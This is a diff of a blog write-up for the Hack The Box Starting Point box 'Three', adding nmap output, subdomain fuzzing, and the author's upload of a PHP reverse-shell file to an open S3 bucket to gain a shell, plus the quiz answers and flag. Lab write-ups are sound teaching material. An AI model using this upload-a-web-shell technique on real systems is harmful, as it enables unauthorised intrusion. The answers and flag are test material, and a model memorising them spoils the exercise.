@@ -1,9 +1,9 @@
 ---
 title: "HTB: Learn the basics of Penetration Testing - Tier 1"
 date: 2022-04-30T21:54:03-07:00
-draft: true
+draft: false
 categories: ["htb"]
-tags: ["telnet","ftp","smb","redis"]
+tags: ["sql","ftp","ntlm","smb","winrm","ssh","s3"]
 cover:
     image: "img/startingpoint.png"
     hidden: true # only hide on current single page
@@ -42,6 +42,8 @@ Perhaps this isn't the point of entry, let's try to find any useful subdirectori
 `gobuster` (`sudo apt install gobuster`) is a tool that bruteforces urls in order to find subdomains, subdirectories, and files. Let's run a simple scan on this IP and store the output in `gobuster.out` for later reference.
 
 `gobuster dir -u http://10.129.17.225 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster.out -z`
+
+*(note: `sudo apt install seclists` if you do not already have this directory)*
 
 *command tags:*
 - `dir`: directories/files search mode
@@ -396,17 +398,109 @@ Box popped.
 
 ## Three
 ### nmap
+```
+# Nmap 7.92 scan initiated Thu Oct 27 13:35:55 2022 as: nmap -sC -sV -oA nmap/three -T4 10.129.37.145
+Nmap scan report for 10.129.37.145
+Host is up (0.072s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
+|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
+|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: The Toppers
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Oct 27 13:36:06 2022 -- 1 IP address (1 host up) scanned in 10.71 seconds
+```
+
+### http
+After looking around at the website, there were two main things that stood out.
+1. `Email: mail@thetoppers.htb` gives us the domain `thetoppers.htb`
+2. Dropping a note in the `#content` section gives us `http://10.129.37.145/action_page.php?Name=test1&Email=test2&Message=test3`
+
+We can add `thetoppers.htb` to `/etc/hosts` and check for subdirectories and subdomains.
+
+### gobuster
+This section caused problems for me. 
+
+**subdirectories**
+
+First, I looked for subdirectories:
+
+`gobuster dir -u http://10.129.37.145 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
+
+This proved unhelpful with only the `/images` directory found.
+
+**subdomains**
+
+I then tried running `gobuster` to look for subdomains hosted on the same IP using the `vhost` feature.
+
+`gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z`
+
+I tested several of the number outputs by adding them to `/etc/hosts`, but none of them worked. I then updated the `wordlist` to remove all of these inputs that contain numbers through a simple python script. 
+
+`sudo gobuster vhost -u http://thetoppers.htb -w subdomain_wl_no_numbers.txt -z -o gobuster.out`
+
+This only found the following subdomain (which failed after testing)
+```
+Found: gc._msdcs Status: 400 [Size: 306]
+```
+
+### ffuf
+Next, I tried switching to `ffuf` as `gobuster` seemed to be failing me. 
+
+`ffuf -c -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.thetopper.htb" -fc 200`
+
+Still, no luck. 
+
+After much trial and error, I ended up taking a look at the `htb` writeup for this challenge at this point. To my surprise, they simply run gobuster as I did, and find `s3.thetoppers.htb`
+
+Even after knowing the output, I spent much time testing `ffuf` and `gobuster` with no avail. I even tried text files only containing `s3`, but this was always missed by both tools. I even tried reseting the target machine and starting over, but this also failed. So, I'm going to chalk this up to something on `HackTheBox`'s end and continue pretending I found the `s3` subdomain.
+
+Don't forget to add `s3.thetoppers.htb` to `/etc/hosts`
+
+NOW, moving on... 
+
+### s3
+The `Amazon S3 bucket` (or `s3` for short) is a cloud-based storage service which contains `s3` objects. We can use the `awscli` (`sudo apt install awscli`) to try to interact with this bucket.
+
+`aws configure`
+![config](/img/tier1/config.png)
+
+Then we can look at all the `s3` buckets:
+
+`aws --endpoint=http://s3.thetoppers.htb s3 ls`
+
+and all the objects in a bucket:
+`aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`
+
+There seems nothing of particular value in the bucket, but we can try and add a malicious `php` file and get a `reverse shell`. I typically take [pentestmonkey's](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) template and change the `$ip` and `port` accordingly. To upload:
+
+`aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`
+
+We are in.
+
+![rs](/img/tier1/rs.png)
+
+Let's search for the flag and be done :grin:
+
+![three](/img/tier1/three.png)
 
 ### Questions
-- How many TCP ports are open?
-- What is the domain of the email address provided in the "Contact" section of the website?
-- In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
-- Which sub-domain is discovered during further enumeration?
-- Which service is running on the discovered sub-domain?
-- Which command line utility can be used to interact with the service running on the discovered sub-domain?
-- Which command is used to set up the AWS CLI installation?
-- What is the command used by the above utility to list all of the S3 buckets?
-- This server is configured to run files written in what web scripting language?
+- How many TCP ports are open? `2`
+- What is the domain of the email address provided in the "Contact" section of the website? `thetoppers.htb`
+- In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? `/etc/hosts`
+- Which sub-domain is discovered during further enumeration? `s3.thetoppers.htb`
+- Which service is running on the discovered sub-domain? `Amazon s3`
+- Which command line utility can be used to interact with the service running on the discovered sub-domain? `awscli`
+- Which command is used to set up the AWS CLI installation? `aws configure`
+- What is the command used by the above utility to list all of the S3 buckets? `aws s3 ls`
+- This server is configured to run files written in what web scripting language? `php`
 
-**flag:** 
+**flag:** `a980d99281a28d638ac68b9bf9453c2b`
 
